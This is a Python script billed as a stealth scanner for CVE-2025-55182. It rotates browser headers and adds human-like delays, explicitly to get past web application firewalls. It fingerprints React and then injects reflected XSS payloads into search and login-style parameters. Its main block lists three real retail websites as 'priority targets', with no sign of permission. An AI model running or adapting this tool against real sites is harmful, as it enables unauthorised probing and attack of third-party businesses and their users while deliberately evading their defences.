#!/usr/bin/env python3
"""
Stealth CVE-2025-55182 Scanner - Bypass WAF Detection
Realistic browser headers + rate limiting
"""

import requests
import random
import time
from urllib.parse import urljoin
import json

class StealthScanner:
    def __init__(self):
        # Realistic browser user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def get_random_headers(self):
        """Generate random realistic headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Referer': 'https://www.google.com/',
            'Cache-Control': 'max-age=0'
        }
        return headers
    
    def stealth_request(self, url, delay=2):
        """Make requests that look like human browsing"""
        headers = self.get_random_headers()
        
        try:
            # Random delay to simulate human behavior
            time.sleep(random.uniform(delay, delay * 2))
            
            response = self.session.get(
                url, 
                headers=headers, 
                timeout=15,
                allow_redirects=True
            )
            
            print(f"[+] SUCCESS: {url} - HTTP {response.status_code}")
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[!] BLOCKED: {url} - {str(e)}")
            return None
    
    def test_react_indicators(self, url):
        """Test for React indicators using stealth approach"""
        response = self.stealth_request(url, delay=3)
        
        if not response:
            return None
            
        content = response.text.lower()
        
        # React detection patterns
        react_patterns = [
            '__react_devtools_global_hook__',
            'react-dom',
            'react@',
            'dangerouslysetinnerhtml',
            '_reactinternalinstance'
        ]
        
        findings = []
        for pattern in react_patterns:
            if pattern in content:
                findings.append(pattern)
        
        if findings:
            print(f"[!] REACT DETECTED: {url}")
            for finding in findings:
                print(f"    - {finding}")
        
        return findings
    
    def test_xss_vectors(self, url, test_params):
        """Test XSS vectors with stealth"""
        findings = []
        
        xss_payloads = [
            '<img src=x onerror="fetch(\'/api/debug\')">',
            '<script>alert(\'xss\')</script>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>'
        ]
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{url}?{param}={payload}"
                response = self.stealth_request(test_url, delay=5)
                
                if response and payload in response.text:
                    findings.append({
                        'url': test_url,
                        'payload': payload,
                        'reflected': True
                    })
                    print(f"[!] XSS REFLECTION: {test_url}")
        
        return findings

# Example usage for your targets
if __name__ == "__main__":
    scanner = StealthScanner()
    
    # Your priority targets
    targets = [
        "https://www.superdrug.com",
        "https://www.theperfumeshop.com",
        "https://lookatme.com.ph"
    ]
    
    print("Starting stealth CVE-2025-55182 scanning...")
    print("Using realistic browser headers and human-like delays\n")
    
    for target in targets:
        print(f"\n[*] Testing: {target}")
        
        # Test main page for React
        react_findings = scanner.test_react_indicators(target)
        
        # Test XSS vectors if React found
        if react_findings:
            xss_findings = scanner.test_xss_vectors(
                target, 
                ['search', 'q', 'name', 'username']
            )
            print(f"[+] Found {len(xss_findings)} potential XSS vectors")
        
        print("-" * 50)
